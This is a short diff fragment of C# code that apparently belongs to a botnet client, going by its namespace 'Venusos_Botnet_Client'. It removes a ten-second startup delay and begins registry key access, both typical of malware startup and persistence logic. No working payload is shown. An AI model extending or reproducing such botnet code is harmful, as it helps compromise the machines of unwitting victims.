@@ -3,8 +3,6 @@ using System.Text;
 using System.Text.Json;
 using Venusos_Botnet_Client;
 
-Thread.Sleep(10000);
-
 try
 {
     Microsoft.Win32.RegistryKey key;
